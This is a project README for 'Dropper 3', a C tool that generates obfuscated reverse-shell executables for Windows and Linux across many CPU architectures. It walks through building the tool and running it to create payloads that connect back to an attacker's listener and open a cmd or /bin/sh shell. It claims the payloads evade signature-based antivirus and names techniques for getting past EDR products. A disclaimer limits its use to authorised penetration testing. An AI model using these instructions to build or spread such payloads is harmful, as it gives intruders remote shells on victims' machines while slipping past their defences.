# Dropper 3 (BCE) - The end of a five year long payload generation odyssey.

![](assets/dropper-3-odyssey.gif)

## Prelude

I started this project to discover a fast and efficient way to generate a reverse shell binary payload without a whole lot of fuss for Cyber Security Experts and Red Teamers alike. From the start, I wanted to use a language that I wasn’t too familiar with, as a challenge for myself to develop this solution. I decided to go with Golang since it was rather popular at the time in our community, and I was anxious to learn the language to keep up with the ever evolving trends in InfoSec. Very quickly I realized how powerful a language like Golang is, as well as some of its common drawbacks. As <a href="https://github.com/byt3bl33d3r">Byt3bl33d3r</a> so elequently put it, Go makes THICC malwares, like 1.8 MB THICC! 😳 Not only that, but the Golang runtime environment and related artifacts tend to migrate with any binary file compiled on ones local system, thus leaving tons of forensic clues for Blue Teamers to determine the origin from where the payload was created, and what tools were used, etc. Just a mess. 

Enter <a href="https://github.com/im4x5yn74x/dropper2">Dropper2</a>. While this project served its purpose at addressing all these pesky artifacts left behind, as best as possible, without going full <a href="https://github.com/burrowers/garble">Garble</a> with it, coupled with some randomized obfuscation, helped get the job done at evading Anti-Virus, and some EDR solutions, at least for a little while. The next step in this evolutionary journey was to test out another unique language growing in popularity, Rust. Over the course of a month, learning the language well enough to be dangerous, and creating <a href="https://github.com/Elmofire/ef">Elmofire</a> as a result, I had yet another obfuscated payload generator, leaving Golang behind, at least for now. After all was said and done, Elmofire, the new and improved Dropper, a solution for the community without all the bloated chubby gophers, and yet, I still felt something was missing from my journey into malware development. 

I decided to take a step back and focus on what other malware authors (good and bad) have used in the past. After thumbing through what seems like endless lines of source code on <a href="https://github.com/vxunderground/MalwareSourceCode">VXUG’s Github</a>, I noticed a very obvious common pattern in language choice: C/C++. This was it! I had always wanted to learn C/C++ but had no idea where to start those 5 years ago. I had learned a great deal regarding low level programming since then, including Assembly fundamentals on various architechtures. Finally, my mind felt ready, and like I’ve always done, I rewrote Dropper, now for a 3rd and final time in C. Taking it way back, (Before the Common Era) 😉

So, with the back story out of the way, may I present: Dropper 3.0 (BCE).

## Dependencies

Given the fact we're using C, you're gonna need every type of compiler used by Dropper3 to build each type of binary payload. Run the following command to install the necessary compilers and build libraries:
<code>sudo apt install gcc make gcc-mingw-w64 binutils-mingw-w64 gcc-mingw-w64-i686 binutils-mingw-w64-i686 gcc-mingw-w64-x86-64 binutils-mingw-w64-x86-64 gcc-x86-64-linux-gnux32 binutils-x86-64-linux-gnu gcc-sparc64-linux-gnu binutils-sparc64-linux-gnu gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu gcc-powerpc-linux-gnu binutils-powerpc-linux-gnu gcc-powerpc64-linux-gnu binutils-powerpc64-linux-gnu gcc-mips-linux-gnu binutils-mips-linux-gnu gcc-mips64-linux-gnuabi64 binutils-mips64-linux-gnuabi64 gcc-i686-linux-gnu binutils-i686-linux-gnu gcc-hppa-linux-gnu binutils-hppa-linux-gnu gcc-hppa64-linux-gnu binutils-hppa64-linux-gnu gcc-alpha-linux-gnu binutils-alpha-linux-gnu gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu gcc-s390x-linux-gnu binutils-s390x-linux-gnu</code>

## Usage

Usage is the same as its predecessors, simply compile the source using <code>gcc -o dropper3 dropper3.c</code> and run <code>./dropper3 -h</code>

E.g. Help Menu
<pre>
$ ./dropper3 -h
Usage: Usage of dropper3:
  -a string
                Architecture: i686, amd64, arm, arm64, powerpc64, powerpc, mips, mips64, s390x, sparc64, riscv64, hppa, hppa64, alpha
  -l string
                Listening host: <listening ip:port>
  -o string
                Output filename: <anything goes>
  -p string             Operating System: windows, linux
  -s string
                Shell type: cmd, powershell, /bin/sh, /bin/bash, /usr/bin/zsh, /system/bin/sh, /bin/busybox
</pre>

E.g. Windows Payload
<pre>
$ ./dropper3 -p windows -a amd64 -l 10.12.1.99:1337 -o potato -s cmd
Operating System: windows
Architecture: amd64
Listening host: 10.12.1.99:1337
Output filename: potato
Shell type: cmd
Payload built successfully
</pre>

Confirm result using the <code>file</code> command
<pre>
$ file potato.exe 
potato.exe: PE32+ executable (console) x86-64, for MS Windows
</pre>

E.g. Linux Payload
<pre>
$  ./dropper3 -p linux -a arm64 -l 10.12.1.99:31337 -o chips -s /bin/sh  
Operating System: linux
Architecture: arm64
Listening host: 10.12.1.99:31337
Output filename: chips
Shell type: /bin/sh
Payload built successfully
</pre>

Confirm result using the <code>file</code> command
<pre>
$  file chips 
chips: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=9eefe4521695a769e0a384e87d1d8ea89b45fd8b, for GNU/Linux 3.7.0, not stripped
</pre>

## F.A.Q.

“So what exactly does this accomplish?”

- Other than my own personal accomplishments, not much; only now instead of producing THICC malwares, the payloads created by Dropper 3 are much smaller, like 1.5MB smaller! Huzzah!

“Besides the weight loss, how much has really changed?”

- Not much to be honest. Still using the same obfuscation and randomization techniques as done in Dropper2. Payloads will still evade off-the-shelf signature-based Anti-Virus, however, for EDRs, you’ll want to couple one of these generated payloads with other techniques, such as Fileless PE Loading, Process Hollowing, Döppleganging, etc. Check out <a href="https://github.com/hasherezade/">Hasherazade’s Github</a> for more awesome research on the topic.

“Is this really the end?”

- Yes, this is the end for Dropper rewrites and language developments. I had initially used this project as an intermediate form of <i>Hello World</i> for malware developers, and I highly recommend anyone out there reading this to follow the same principal. Take an idea for some really cool malware/innocent program you’d like to create, then pick a language you’ve never used before and learn it! Learn that language to build the program you want to see come to life in the language you want to see it written in. I promise you, you’ll learn way more than you ever thought you would, and you’ll become a better developer because of it.

“How about that disclaimer?”

- Awww here it goes! 😎

## Disclaimer

This tool is intended for Penetration Testers, Security Researchers and Red Teamers alike. DO NOT USE this tool for ILLEGAL purposes or WITHOUT the CONSENT from the parties involved while agreed upon by LEGAL DOCUMENTATION or PERMISSIVE ACCESS for security consultation or research purposes. I, hereby relinquish ALL responsibility for any illegal use of this tool or ANY binary payloads subsequently generated by the tool as described. You have been warned.
